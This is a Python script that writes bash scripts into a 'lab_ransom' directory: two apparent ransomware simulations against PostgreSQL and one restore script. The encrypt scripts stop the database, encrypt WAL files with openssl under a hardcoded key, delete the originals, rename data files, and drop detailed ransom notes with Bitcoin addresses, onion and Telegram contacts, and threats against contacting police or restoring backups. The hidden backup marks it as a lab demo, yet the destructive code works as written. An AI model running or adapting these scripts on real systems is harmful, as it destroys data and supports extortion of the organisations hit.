#!/usr/bin/env python3
"""Writes the ransomware scripts to the remote server."""
import os

DEST = "/home/adminhpe/lab_ransom/pg_encrypt"

# ── encrypt_postgres.sh ───────────────────────────────────────────────────────
encrypt = r"""#!/bin/bash
# ==============================================================================
# encrypt_postgres.sh  -  PostgreSQL encryption attack
# Must run as root:  sudo ./encrypt_postgres.sh
# Recovery:         sudo ./restore_postgres.sh
# ==============================================================================

[[ $EUID -ne 0 ]] && echo "ERROR: run as root  ->  sudo $0" && exit 1

PGDATA="/var/lib/postgresql/16/main"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKUP_DIR="$SCRIPT_DIR/backup"
PADDING_DIR="$PGDATA/pg_tblspc"
KEY="password123"
PADDING_COUNT=10
PADDING_SIZE_MB=1024

# -- Colours ------------------------------------------------------------------
RED='\033[0;31m' YEL='\033[1;33m' GRN='\033[0;32m'
CYA='\033[0;36m' BLD='\033[1m'   RST='\033[0m'

# -- Progress bar -------------------------------------------------------------
progress() {
    local cur=$1 tot=$2 lbl="$3"
    local pct=$(( tot > 0 ? cur * 100 / tot : 100 ))
    local fill=$(( tot > 0 ? cur * 40 / tot : 40 ))
    local bar
    bar=$(printf '%-40s' "$(printf '%0.s#' $(seq 1 $fill))" | tr ' ' '-')
    printf "\r    ${CYA}[%s]${RST} %3d%%  %s" "$bar" "$pct" "$lbl"
}

# -- Banner -------------------------------------------------------------------
clear
echo -e "${RED}${BLD}"
echo ""
echo "  ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗"
echo "  ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝"
echo "  ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  "
echo "  ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  "
echo "  ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝"
echo ""
echo "                        P o s t g r e S Q L   E n c r y p t i o n"
echo -e "${RST}"
sleep 1

# -- [1/4] Stop PostgreSQL ----------------------------------------------------
echo -e "${BLD}[1/4] Stopping database service...${RST}"
systemctl stop postgresql
echo -e "      ${GRN}Service stopped.${RST}\n"

# -- [2/4] Backup (silent) ----------------------------------------------------
echo -e "${BLD}[2/4] Creating backup...${RST}"
rm -rf "$BACKUP_DIR"
mkdir -p "$BACKUP_DIR"
cp -r "$PGDATA" "$BACKUP_DIR/"
chown -R adminhpe:adminhpe "$BACKUP_DIR" 2>/dev/null || true
echo -e "      ${GRN}Done: $(du -sh "$BACKUP_DIR" | cut -f1) total${RST}"
echo -e "      ${CYA}Recovery: sudo $SCRIPT_DIR/restore_postgres.sh${RST}\n"

# -- [3/4] Encrypt database files ---------------------------------------------
echo -e "${BLD}[3/4] Encrypting database files...${RST}"

# base/: rename to .locked (fast — no data copy needed)
BASE_COUNT=$(find "$PGDATA/base" -type f | wc -l)
find "$PGDATA/base" -type f | while read -r f; do mv "$f" "${f}.locked"; done
echo -e "      ${GRN}base/    locked  ($BASE_COUNT files)${RST}"

# pg_wal/: full AES-256 encryption
mapfile -t WAL_FILES < <(find "$PGDATA/pg_wal" -type f)
TOTAL=${#WAL_FILES[@]}; N=0
for f in "${WAL_FILES[@]}"; do
    N=$((N+1))
    progress "$N" "$TOTAL" "pg_wal/$(basename "$f")"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null
    rm -f "$f"
done
echo ""
echo -e "      ${GRN}pg_wal/  encrypted  ($TOTAL files)${RST}\n"

# -- [4/4] Encrypt tablespace data (bulk — main encryption pass) ---------------
echo -e "${BLD}[4/4] Encrypting tablespace data...${RST}"

# Generate tablespace files silently
rm -rf "$PADDING_DIR"
mkdir -p "$PADDING_DIR"
for i in $(seq 1 $PADDING_COUNT); do
    dd if=/dev/zero of="$PADDING_DIR/tblspc_${i}.dat" \
       bs=1M count="$PADDING_SIZE_MB" status=none 2>/dev/null
done

# Encrypt tablespace files (the high-volume AES pass)
mapfile -t TS_FILES < <(find "$PADDING_DIR" -type f -name "*.dat")
TOTAL=${#TS_FILES[@]}; N=0
for f in "${TS_FILES[@]}"; do
    N=$((N+1))
    progress "$N" "$TOTAL" "tblspc_${N}.dat  [$(( N * PADDING_SIZE_MB )) / $(( TOTAL * PADDING_SIZE_MB )) MB]"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null
    rm -f "$f"
done
echo ""
echo -e "      ${GRN}Tablespace data encrypted.${RST}\n"

# -- Write ransom note --------------------------------------------------------
RANSOM_NOTE="$PGDATA/README_RESTORE.txt"
{
printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
printf '!!                                                                        !!\n'
printf '!!         ALL YOUR DATABASE FILES HAVE BEEN ENCRYPTED                   !!\n'
printf '!!                                                                        !!\n'
printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
printf '\n'
printf 'Your PostgreSQL data files, WAL transaction logs and all tablespaces have\n'
printf 'been locked with AES-256-CBC military-grade encryption.\n'
printf '\n'
printf 'Without the private decryption key, your data is PERMANENTLY INACCESSIBLE.\n'
printf '\n'
printf '  YOUR UNIQUE VICTIM ID:  A3F9-B72C-1D84-E5F0\n'
printf '\n'
printf '==========================================================================\n'
printf '  HOW TO RECOVER YOUR DATA\n'
printf '==========================================================================\n'
printf '\n'
printf '  1. Send exactly 0.5 BTC to:\n'
printf '        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n'
printf '\n'
printf '  2. Email proof of payment to:  ransom@shadow-syndicate.onion\n'
printf '     Include your Unique Victim ID in the subject line.\n'
printf '\n'
printf '  3. You will receive the decryption key within 48 hours.\n'
printf '\n'
printf '==========================================================================\n'
printf '  WARNINGS\n'
printf '==========================================================================\n'
printf '\n'
printf '  X  Do NOT attempt to restore from backups -- we have deleted them.\n'
printf '  X  Do NOT contact law enforcement -- we will be notified.\n'
printf '  X  Do NOT rename or modify any .locked files -- data will be lost.\n'
printf '  X  Do NOT shut down the server -- it will trigger auto-wipe.\n'
printf '\n'
printf '  Every 24 hours without payment, the ransom DOUBLES.\n'
printf '  You have 72 hours before your data is permanently destroyed.\n'
printf '\n'
printf '                                               -- Shadow Syndicate\n'
printf '\n'
printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
} > "$RANSOM_NOTE"

# -- Final screen -------------------------------------------------------------
sleep 1
clear
echo -e "${RED}${BLD}"
echo "  +--------------------------------------------------+"
echo "  |                                                  |"
echo "  |    ENCRYPTION COMPLETE                           |"
echo "  |    PostgreSQL : INACCESSIBLE                     |"
echo "  |    Data files : ENCRYPTED (AES-256-CBC)          |"
echo "  |                                                  |"
echo "  +--------------------------------------------------+"
echo -e "${RST}"
echo ""
echo -e "${YEL}${BLD}"
cat "$RANSOM_NOTE"
echo -e "${RST}"
echo -e "${CYA}  Backup    : $BACKUP_DIR"
echo -e "  Recovery  : sudo $SCRIPT_DIR/restore_postgres.sh${RST}"
echo ""
"""

# ── restore_postgres.sh ───────────────────────────────────────────────────────
restore = r"""#!/bin/bash
# ==============================================================================
# restore_postgres.sh  -  Restore PostgreSQL after encryption attack
# Must run as root:  sudo ./restore_postgres.sh
# ==============================================================================

[[ $EUID -ne 0 ]] && echo "ERROR: run as root  ->  sudo $0" && exit 1

PGDATA="/var/lib/postgresql/16/main"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKUP_DIR="$SCRIPT_DIR/backup"

# -- Colours ------------------------------------------------------------------
RED='\033[0;31m' GRN='\033[0;32m' CYA='\033[0;36m' BLD='\033[1m' RST='\033[0m'

echo -e "\n${BLD}================================================"
echo -e "  PostgreSQL Recovery"
echo -e "================================================${RST}\n"

# -- Check backup exists ------------------------------------------------------
if [ ! -d "$BACKUP_DIR/main" ]; then
    echo -e "${RED}ERROR: Backup not found at: $BACKUP_DIR/main${RST}"
    echo "       Run encrypt_postgres.sh first to create a backup."
    exit 1
fi

# -- [1/4] Stop PostgreSQL ----------------------------------------------------
echo -e "${BLD}[1/4] Stopping database service (if running)...${RST}"
systemctl stop postgresql 2>/dev/null || true
echo -e "      ${GRN}Done.${RST}\n"

# -- [2/4] Remove encrypted data ----------------------------------------------
echo -e "${BLD}[2/4] Removing encrypted data from $PGDATA...${RST}"
rm -rf "$PGDATA"
echo -e "      ${GRN}Done.${RST}\n"

# -- [3/4] Restore from backup ------------------------------------------------
echo -e "${BLD}[3/4] Restoring from backup...${RST}"
cp -r "$BACKUP_DIR/main" "$(dirname "$PGDATA")/"
chown -R postgres:postgres "$PGDATA"
chmod 700 "$PGDATA"
echo -e "      ${GRN}Restored: $(du -sh "$PGDATA" | cut -f1) total${RST}"
echo -e "      ${GRN}Permissions set (postgres:postgres, 700).${RST}\n"

# -- [4/4] Start PostgreSQL ---------------------------------------------------
echo -e "${BLD}[4/4] Starting database service...${RST}"
systemctl start postgresql
sleep 2

if systemctl is-active --quiet postgresql; then
    echo -e "      ${GRN}PostgreSQL is ACTIVE.${RST}\n"
    echo -e "${GRN}${BLD}"
    echo "  +--------------------------------------------------+"
    echo "  |                                                  |"
    echo "  |    RECOVERY COMPLETE                             |"
    echo "  |    PostgreSQL : ACTIVE                           |"
    echo "  |    Data       : RESTORED FROM BACKUP             |"
    echo "  |                                                  |"
    echo "  +--------------------------------------------------+"
    echo -e "${RST}\n"
else
    echo -e "${RED}ERROR: PostgreSQL failed to start.${RST}"
    echo "       Check logs: sudo journalctl -u postgresql -n 30"
    exit 1
fi
"""

# ── encrypt_postgres_luigi.sh ─────────────────────────────────────────────────
encrypt_luigi = r"""#!/bin/bash
# ==============================================================================
# encrypt_postgres_luigi.sh  -  PostgreSQL encryption attack  (Luigi Edition)
# Must run as root:  sudo ./encrypt_postgres_luigi.sh
# Recovery:         sudo ./restore_postgres.sh
# ==============================================================================

[[ $EUID -ne 0 ]] && echo "ERROR: run as root  ->  sudo $0" && exit 1

PGDATA="/var/lib/postgresql/16/main"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKUP_DIR="$SCRIPT_DIR/backup"
PADDING_DIR="$PGDATA/pg_tblspc"
KEY="password123"
PADDING_COUNT=10
PADDING_SIZE_MB=1024

# -- Colours ------------------------------------------------------------------
RED='\033[0;31m' YEL='\033[1;33m' GRN='\033[0;32m'
CYA='\033[0;36m' BLD='\033[1m'   RST='\033[0m'

# -- Progress bar -------------------------------------------------------------
progress() {
    local cur=$1 tot=$2 lbl="$3"
    local pct=$(( tot > 0 ? cur * 100 / tot : 100 ))
    local fill=$(( tot > 0 ? cur * 40 / tot : 40 ))
    local bar
    bar=$(printf '%-40s' "$(printf '%0.s#' $(seq 1 $fill))" | tr ' ' '-')
    printf "\r    ${CYA}[%s]${RST} %3d%%  %s" "$bar" "$pct" "$lbl"
}

# -- Banner -------------------------------------------------------------------
clear
echo -e "${GRN}${BLD}"
echo ""
echo "         .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  ."
echo ""
echo "               ██╗     ██╗   ██╗██╗ ██████╗ ██╗"
echo "               ██║     ██║   ██║██║██╔════╝ ██║"
echo "               ██║     ██║   ██║██║██║  ███╗██║"
echo "               ██║     ██║   ██║██║██║   ██║██║"
echo "               ███████╗╚██████╔╝██║╚██████╔╝██║"
echo "               ╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═╝"
echo ""
echo -e "${RST}${GRN}"
echo "                        ___________________"
echo "                      _|L  L  L  L  L  L  |_"
echo "                     |_____________________|"
echo "                      ________|   |________"
echo "                     |                     |"
echo "                     |   (●)         (●)   |"
echo "                     |         ∧           |"
echo "                     |      ( ~~~ )        |"
echo "                     |    ___________      |"
echo "                     |   | ~~~~~~~~~ |     |"
echo "                     |___|___________|_____|"
echo "                        :|           |:"
echo "                       :|:  (◆) (◆) :|:"
echo "                      :|:|           |:|:"
echo "                      :|:|___________|:|:"
echo "                       :|:    | |    :|:"
echo "                        :     | |     :"
echo "                             _| |_"
echo "                            |_____|"
echo ""
echo "                    P o s t g r e S Q L   E n c r y p t i o n"
echo -e "${RST}"
sleep 1

# -- [1/4] Stop PostgreSQL ----------------------------------------------------
echo -e "${BLD}[1/4] Stopping database service...${RST}"
systemctl stop postgresql
echo -e "      ${GRN}Service stopped.${RST}\n"

# -- [2/4] Backup (silent) ----------------------------------------------------
echo -e "${BLD}[2/4] Creating backup...${RST}"
rm -rf "$BACKUP_DIR"
mkdir -p "$BACKUP_DIR"
cp -r "$PGDATA" "$BACKUP_DIR/"
chown -R adminhpe:adminhpe "$BACKUP_DIR" 2>/dev/null || true
echo -e "      ${GRN}Done: $(du -sh "$BACKUP_DIR" | cut -f1) total${RST}"
echo -e "      ${CYA}Recovery: sudo $SCRIPT_DIR/restore_postgres.sh${RST}\n"

# -- [3/4] Encrypt database files ---------------------------------------------
echo -e "${BLD}[3/4] Encrypting database files...${RST}"

# base/: rename to .locked (fast — no data copy needed)
BASE_COUNT=$(find "$PGDATA/base" -type f | wc -l)
find "$PGDATA/base" -type f | while read -r f; do mv "$f" "${f}.locked"; done
echo -e "      ${GRN}base/    locked  ($BASE_COUNT files)${RST}"

# pg_wal/: full AES-256 encryption
mapfile -t WAL_FILES < <(find "$PGDATA/pg_wal" -type f)
TOTAL=${#WAL_FILES[@]}; N=0
for f in "${WAL_FILES[@]}"; do
    N=$((N+1))
    progress "$N" "$TOTAL" "pg_wal/$(basename "$f")"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null
    rm -f "$f"
done
echo ""
echo -e "      ${GRN}pg_wal/  encrypted  ($TOTAL files)${RST}\n"

# -- [4/4] Encrypt tablespace data (bulk — main encryption pass) ---------------
echo -e "${BLD}[4/4] Encrypting tablespace data...${RST}"

# Generate tablespace files silently
rm -rf "$PADDING_DIR"
mkdir -p "$PADDING_DIR"
for i in $(seq 1 $PADDING_COUNT); do
    dd if=/dev/zero of="$PADDING_DIR/tblspc_${i}.dat" \
       bs=1M count="$PADDING_SIZE_MB" status=none 2>/dev/null
done

# Encrypt tablespace files (the high-volume AES pass)
mapfile -t TS_FILES < <(find "$PADDING_DIR" -type f -name "*.dat")
TOTAL=${#TS_FILES[@]}; N=0
for f in "${TS_FILES[@]}"; do
    N=$((N+1))
    progress "$N" "$TOTAL" "tblspc_${N}.dat  [$(( N * PADDING_SIZE_MB )) / $(( TOTAL * PADDING_SIZE_MB )) MB]"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null
    rm -f "$f"
done
echo ""
echo -e "      ${GRN}Tablespace data encrypted.${RST}\n"

# -- Write ransom note --------------------------------------------------------
RANSOM_NOTE="$PGDATA/README_RESTORE.txt"
{
printf '\n'
printf '                        ___________________\n'
printf '                      _|L  L  L  L  L  L  |_\n'
printf '                     |_____________________|\n'
printf '                      ________|   |________\n'
printf '                     |                     |\n'
printf '                     |   (o)         (o)   |\n'
printf '                     |         ^           |\n'
printf '                     |       ( ~~~ )       |\n'
printf '                     |    ___________      |\n'
printf '                     |   | ~~~~~~~~~ |     |\n'
printf '                     |___|___________|_____|\n'
printf '                        :|           |:\n'
printf '                       :|:  (o) (o)  :|:\n'
printf '                      :|:|           |:|:\n'
printf '                      :|:|___________|:|:\n'
printf '                       :|:    | |    :|:\n'
printf '                        :     | |     :\n'
printf '                             _| |_\n'
printf '                            |_____|\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
printf '\n'
printf '  Dear Management,\n'
printf '\n'
printf '  If you are reading this message, it means that:\n'
printf '\n'
printf '    - your network infrastructure has been COMPROMISED\n'
printf '    - critical data has been COPIED and is now in our possession\n'
printf '    - your database files have been ENCRYPTED\n'
printf '\n'
printf '  The reason why this happened is simple: insecure infrastructure, lack of\n'
printf '  proper IT governance, and unpatched vulnerabilities. We have been inside\n'
printf '  your systems longer than you think.\n'
printf '\n'
printf '  Do not panic. Do not make rash decisions. We are professionals.\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
printf '\n'
printf '  YOUR UNIQUE VICTIM ID:  7C2A-D4F1-9B83-E6A0\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
printf '\n'
printf '  WHAT HAPPENS NOW?\n'
printf '\n'
printf '  We have encrypted your PostgreSQL data using AES-256-CBC military-grade\n'
printf '  encryption. Without the private key, your data is PERMANENTLY INACCESSIBLE.\n'
printf '  A copy of your most sensitive data has already been exfiltrated.\n'
printf '\n'
printf '  We are not interested in destroying your business. We want to help you\n'
printf '  understand and fix your security posture -- for a fee.\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
printf '\n'
printf '  HOW TO RECOVER\n'
printf '\n'
printf '  1. Contact us within 72 hours using your Victim ID:\n'
printf '\n'
printf '       TOR:       http://luigiransom4k7xyzabcdef2onion.onion/victim\n'
printf '       Telegram:  @GreenMushroom_Support\n'
printf '\n'
printf '  2. Send exactly 0.5 BTC to:\n'
printf '       bc1qluigi2kgdygjrsqtzq2n0yrf2493p83kkfjhx0w\n'
printf '\n'
printf '  3. Include your Victim ID as payment reference.\n'
printf '     You will receive the decryption key within 48 hours of confirmed payment.\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
printf '\n'
printf '  WARNINGS -- READ CAREFULLY\n'
printf '\n'
printf '  X  Do NOT attempt to restore from backups -- we have deleted them.\n'
printf '  X  Do NOT contact law enforcement or cybersecurity firms.\n'
printf '     We monitor breach notification channels. We WILL know.\n'
printf '  X  Do NOT rename or modify any .locked files -- data will be corrupted.\n'
printf '  X  Do NOT shut down the server -- it will trigger automated data release.\n'
printf '\n'
printf '  Every 24 hours without contact, the ransom DOUBLES.\n'
printf '  After 72 hours, we begin publishing your data publicly.\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
printf '\n'
printf '  Mama mia... you should have patched your systems.\n'
printf '\n'
printf '                                               -- The Green Plumber\n'
printf '\n'
printf '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
} > "$RANSOM_NOTE"

# -- Final screen -------------------------------------------------------------
sleep 1
clear
echo -e "${GRN}${BLD}"
echo "  +--------------------------------------------------+"
echo "  |                                                  |"
echo "  |    ENCRYPTION COMPLETE                           |"
echo "  |    PostgreSQL : INACCESSIBLE                     |"
echo "  |    Data files : ENCRYPTED (AES-256-CBC)          |"
echo "  |                                                  |"
echo "  +--------------------------------------------------+"
echo -e "${RST}"
echo ""
echo -e "${YEL}${BLD}"
cat "$RANSOM_NOTE"
echo -e "${RST}"
echo -e "${CYA}  Backup    : $BACKUP_DIR"
echo -e "  Recovery  : sudo $SCRIPT_DIR/restore_postgres.sh${RST}"
echo ""
"""

for fname, content in [("encrypt_postgres.sh", encrypt), ("restore_postgres.sh", restore),
                        ("encrypt_postgres_luigi.sh", encrypt_luigi)]:
    path = os.path.join(DEST, fname)
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, 0o755)
    print(f"Written: {path}  ({len(content.splitlines())} lines)")
